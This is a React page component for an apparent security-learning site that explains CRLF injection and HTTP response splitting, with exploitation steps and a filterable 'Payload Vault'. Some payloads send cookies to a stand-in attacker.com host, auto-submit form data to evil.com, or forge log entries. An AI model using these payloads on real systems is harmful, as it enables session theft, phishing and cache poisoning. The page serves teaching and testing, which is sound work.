import React, { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import Sidebar from '../../components/navigation/Sidebar';
import Breadcrumb from '../../components/navigation/Breadcrumb';
import GlobalSearch from '../../components/navigation/GlobalSearch';
import VulnerabilityHeader from './components/VulnerabilityHeader';
import ExplanationCard from './components/ExplanationCard';
import PayloadCard from './components/PayloadCard';
import TechniqueSection from './components/TechniqueSection';
import FilterChips from './components/FilterChips';
import { RelatedVulnerabilities, ModeToggle } from '../../components/shared';

const CRLFInjectionDetails = () => {
  const [mode, setMode] = useState('beginner');
  const [activeFilters, setActiveFilters] = useState({});

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const vulnerabilityData = {
    title: "CRLF Injection",
    description: "CRLF (Carriage Return Line Feed) injection is a web security vulnerability that allows attackers to inject special characters into HTTP headers, enabling HTTP response splitting, cache poisoning, and log injection attacks. By manipulating newline characters, attackers can control server responses and compromise application security.",
    severity: "high",
    lastUpdated: "January 16, 2026"
  };

  const explanationCards = [
    {
      title: "What is CRLF Injection?",
      icon: "Info",
      iconColor: "var(--color-accent)",
      content: [
        "CRLF injection occurs when an attacker can insert Carriage Return (CR, ASCII 13, \\r) and Line Feed (LF, ASCII 10, \\n) characters into an application's output. These special characters are used to denote the end of a line and the start of a new one in HTTP protocol.",
        "When user input containing CRLF sequences is reflected in HTTP headers without proper sanitization, attackers can inject arbitrary headers or even split the HTTP response into multiple responses, leading to various security vulnerabilities including XSS, cache poisoning, and session hijacking."
      ]
    },
    {
      title: "HTTP Header Manipulation",
      icon: "Code",
      iconColor: "var(--color-accent-green)",
      content: [
        "HTTP headers are separated by CRLF sequences (\\r\\n). By injecting these characters, attackers can add new headers to the HTTP response. This can be exploited to set malicious cookies, modify content-type headers, or inject JavaScript code through headers like X-XSS-Protection.",
        "The vulnerability typically occurs in redirect URLs, cookie values, or any user-controlled input that gets reflected in HTTP response headers. Modern frameworks have built-in protections, but legacy applications and custom implementations remain vulnerable."
      ]
    },
    {
      title: "Response Splitting Attacks",
      icon: "Split",
      iconColor: "var(--color-warning)",
      content: [
        "HTTP response splitting is the most severe form of CRLF injection. By injecting two consecutive CRLF sequences (\\r\\n\\r\\n), an attacker can terminate the current HTTP response headers and start injecting the response body, or even create an entirely new HTTP response.",
        "This allows attackers to serve malicious content to users, poison web caches with attacker-controlled responses, and perform sophisticated phishing attacks by controlling what content victims see when accessing legitimate URLs."
      ]
    }
  ];

  const payloads = [
    {
      id: 1,
      payload: "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>",
      category: "Response Splitting",
      difficulty: "advanced",
      description: "Complete HTTP response splitting payload that injects a new response with XSS",
      context: "Use in redirect parameters or Location headers"
    },
    {
      id: 2,
      payload: "%0d%0aSet-Cookie:%20admin=true",
      category: "Header Injection",
      difficulty: "beginner",
      description: "Simple cookie injection to set arbitrary cookie values",
      context: "Effective when input is reflected in response headers"
    },
    {
      id: 3,
      payload: "%0d%0aLocation:%20http://evil.com",
      category: "Header Injection",
      difficulty: "intermediate",
      description: "Redirect injection to send users to attacker-controlled domain",
      context: "Works in applications that reflect user input in redirect responses"
    },
    {
      id: 4,
      payload: "%0aSet-Cookie:%20sessionid=malicious%0aContent-Type:%20text/html%0a%0a<html><body><h1>Phishing</h1></body></html>",
      category: "Response Splitting",
      difficulty: "advanced",
      description: "Multi-header injection with HTML content injection for phishing",
      context: "Requires vulnerable redirect or header reflection point"
    },
    {
      id: 5,
      payload: "\\r\\nX-XSS-Protection:%200\\r\\nContent-Type:%20text/html\\r\\n\\r\\n<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
      category: "Cache Poisoning",
      difficulty: "expert",
      description: "Disables XSS protection and injects cookie-stealing script for cache poisoning",
      context: "Targets cached responses in CDN or proxy servers"
    },
    {
      id: 6,
      payload: "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img%20src=x%20onerror=alert(document.domain)>",
      category: "Header Injection",
      difficulty: "intermediate",
      description: "Content-Type manipulation with XSS payload injection",
      context: "Bypasses content-type restrictions in some applications"
    },
    {
      id: 7,
      payload: "\\r\\n\\r\\n<html><body><form action='http://evil.com' method='POST'><input type='hidden' name='data' value='stolen'/><script>document.forms[0].submit()</script></form></body></html>",
      category: "Response Splitting",
      difficulty: "expert",
      description: "Auto-submitting form injection for data exfiltration",
      context: "Advanced phishing and data theft scenarios"
    },
    {
      id: 8,
      payload: "%0d%0aCache-Control:%20public%0d%0aExpires:%20Mon,%2031%20Dec%202099%2023:59:59%20GMT",
      category: "Cache Poisoning",
      difficulty: "advanced",
      description: "Cache control manipulation to persist malicious responses",
      context: "Targets proxy and CDN caching mechanisms"
    }
  ];

  const techniques = [
    {
      title: "Basic Header Injection",
      icon: "FileCode",
      steps: [
        "Identify input fields that are reflected in HTTP response headers (redirect URLs, cookie values, custom headers)",
        "Test for CRLF injection by inserting URL-encoded CRLF sequences: %0d%0a or \\r\\n",
        "Observe the HTTP response headers using browser developer tools or proxy tools like Burp Suite",
        "If successful, inject a Set-Cookie header to verify control: %0d%0aSet-Cookie: test=injected",
        "Escalate to more sophisticated attacks like XSS or response splitting based on application behavior"
      ],
      codeExample: `# Testing for CRLF injection
GET /redirect?url=http://example.com%0d%0aSet-Cookie:%20injected=true HTTP/1.1
Host: vulnerable-site.com

# Expected vulnerable response:
HTTP/1.1 302 Found
Location: http://example.com
Set-Cookie: injected=true
Content-Length: 0`
    },
    {
      title: "HTTP Response Splitting",
      icon: "Split",
      steps: [
        "Locate a parameter that controls redirect location or is reflected in response headers",
        "Inject double CRLF sequence (%0d%0a%0d%0a) to terminate headers and start response body",
        "Craft a complete HTTP response including status line, headers, and malicious body content",
        "Test the payload to ensure the application processes it as a separate response",
        "Leverage the split response for cache poisoning, XSS, or phishing attacks"
      ],
      codeExample: `# Response splitting payload
GET /redirect?url=http://example.com%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('XSS')</script> HTTP/1.1
Host: vulnerable-site.com

# Result: Two HTTP responses
# Response 1: Original redirect (terminated early)
# Response 2: Attacker-controlled response with XSS`
    },
    {
      title: "Log Injection Attack",
      icon: "FileText",
      steps: [
        "Identify log entries that include user-controllable input (usernames, search queries, URLs)",
        "Inject CRLF sequences followed by fake log entries to manipulate log files",
        "Create false audit trails or hide malicious activities by injecting misleading log entries",
        "Use log injection to bypass security monitoring or frame other users",
        "Combine with other attacks like privilege escalation if logs are used for authentication"
      ],
      codeExample: `# Log injection payload in username field
username=admin%0d%0a[2025-12-22 17:37:20] INFO: User 'attacker' logged in successfully%0d%0a[2025-12-22 17:37:21] INFO: Admin privileges granted to 'attacker'

# Resulting log file:
[2025-12-22 17:37:19] INFO: Login attempt for user 'admin
[2025-12-22 17:37:20] INFO: User 'attacker' logged in successfully
[2025-12-22 17:37:21] INFO: Admin privileges granted to 'attacker'' failed`
    }
  ];

  const filterOptions = {
    difficulty: ['beginner', 'intermediate', 'advanced', 'expert'],
    category: ['Header Injection', 'Response Splitting', 'Cache Poisoning', 'Log Poisoning'],
    targetType: ['Web Application', 'API', 'CDN', 'Proxy Server']
  };

  const relatedVulnerabilities = [
    {
      id: 1,
      name: "Cross-Site Scripting (XSS)",
      description: "Client-side code injection vulnerability often combined with CRLF injection for header-based XSS attacks",
      path: "/xss",
      icon: "Code",
      severity: "critical"
    },
    {
      id: 2,
      name: "HTTP Response Splitting",
      description: "Advanced form of CRLF injection that allows complete control over HTTP responses",
      path: "/vulnerabilities-overview",
      icon: "Split",
      severity: "high"
    },
    {
      id: 3,
      name: "Cache Poisoning",
      description: "Attack technique that leverages CRLF injection to poison web caches with malicious content",
      path: "/vulnerabilities-overview",
      icon: "Database",
      severity: "high"
    },
    {
      id: 4,
      name: "Session Hijacking",
      description: "Cookie manipulation through CRLF injection can lead to session takeover attacks",
      path: "/vulnerabilities-overview",
      icon: "Lock",
      severity: "critical"
    }
  ];

  const handleFilterChange = (filterKey, values) => {
    setActiveFilters(prev => ({
      ...prev,
      [filterKey]: values
    }));
  };

  const filteredPayloads = payloads?.filter(payload => {
    if (mode === 'beginner' && (payload?.difficulty === 'expert' || payload?.difficulty === 'advanced')) {
      return false;
    }

    for (const [key, values] of Object.entries(activeFilters)) {
      if (values?.length === 0) continue;
      
      if (key === 'difficulty' && !values?.includes(payload?.difficulty)) {
        return false;
      }
      if (key === 'category' && !values?.includes(payload?.category)) {
        return false;
      }
    }
    
    return true;
  });

  return (
    <>
      <Helmet>
        <title>CRLF Injection Details - Trinet_Layer</title>
        <meta name="description" content="Comprehensive guide to CRLF injection vulnerabilities, HTTP response splitting, and header manipulation techniques with practical payloads and exploitation methods." />
      </Helmet>
      <div className="min-h-screen bg-background">
        <Sidebar />
        
        <div className="lg:ml-[280px] lg:w-[calc(100%-280px)] overflow-x-hidden">
          <div className="sticky top-0 z-40 bg-background/80 backdrop-blur-lg border-b border-border">
            <div className="pl-16 pr-4 md:px-6 lg:px-8 py-4">
              <GlobalSearch />
            </div>
          </div>

          <main className="px-4 md:px-6 lg:px-8 py-6 md:py-8 lg:py-10">
            <Breadcrumb />

            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4 mb-6 md:mb-8">
              <div>
                <h2 className="text-xl md:text-2xl font-semibold text-foreground mb-2">
                  Vulnerability Deep Dive
                </h2>
                <p className="text-sm md:text-base text-muted-foreground">
                  Comprehensive analysis and exploitation techniques
                </p>
              </div>
              <ModeToggle mode={mode} onModeChange={setMode} />
            </div>

            <VulnerabilityHeader {...vulnerabilityData} />

            <div className="mb-8 md:mb-10 lg:mb-12">
              <h2 className="text-2xl md:text-3xl font-semibold text-foreground mb-6">
                Understanding CRLF Injection
              </h2>
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {explanationCards?.map((card, index) => (
                  <ExplanationCard key={index} {...card} />
                ))}
              </div>
            </div>

            <div className="mb-8 md:mb-10 lg:mb-12">
              <h2 className="text-2xl md:text-3xl font-semibold text-foreground mb-6">
                Exploitation Techniques
              </h2>
              {techniques?.map((technique, index) => (
                <TechniqueSection key={index} {...technique} />
              ))}
            </div>

            <div className="mb-8 md:mb-10 lg:mb-12">
              <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-6">
                <div>
                  <h2 className="text-2xl md:text-3xl font-semibold text-foreground mb-2">
                    Payload Vault
                  </h2>
                  <p className="text-sm md:text-base text-muted-foreground">
                    {filteredPayloads?.length} payload{filteredPayloads?.length !== 1 ? 's' : ''} available
                  </p>
                </div>
              </div>

              <FilterChips
                filters={filterOptions}
                activeFilters={activeFilters}
                onFilterChange={handleFilterChange}
              />

              <div className="grid grid-cols-1 gap-4 md:gap-5 lg:gap-6">
                {filteredPayloads?.map((payload) => (
                  <PayloadCard key={payload?.id} {...payload} />
                ))}
              </div>

              {filteredPayloads?.length === 0 && (
                <div className="text-center py-12 md:py-16">
                  <p className="text-base md:text-lg text-muted-foreground mb-4">
                    No payloads match your current filters
                  </p>
                  <button
                    onClick={() => setActiveFilters({})}
                    className="text-sm text-accent hover:underline font-medium"
                  >
                    Clear all filters
                  </button>
                </div>
              )}
            </div>

            <RelatedVulnerabilities vulnerabilities={relatedVulnerabilities} />
          </main>

          <footer className="border-t border-border mt-12 md:mt-16 lg:mt-20">
            <div className="px-4 md:px-6 lg:px-8 py-8 md:py-10">
              <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
                <p className="text-sm text-muted-foreground font-medium">
                  © {new Date()?.getFullYear()} Trinet_Layer. All rights reserved.
                </p>
                <div className="flex items-center gap-4">
                  <a href="#" className="text-sm text-muted-foreground hover:text-accent transition-colors duration-250 ease-cyber">
                    Documentation
                  </a>
                  <a href="#" className="text-sm text-muted-foreground hover:text-accent transition-colors duration-250 ease-cyber">
                    GitHub
                  </a>
                  <a href="#" className="text-sm text-muted-foreground hover:text-accent transition-colors duration-250 ease-cyber">
                    Discord
                  </a>
                </div>
              </div>
            </div>
          </footer>
        </div>
      </div>
    </>
  );
};

export default CRLFInjectionDetails;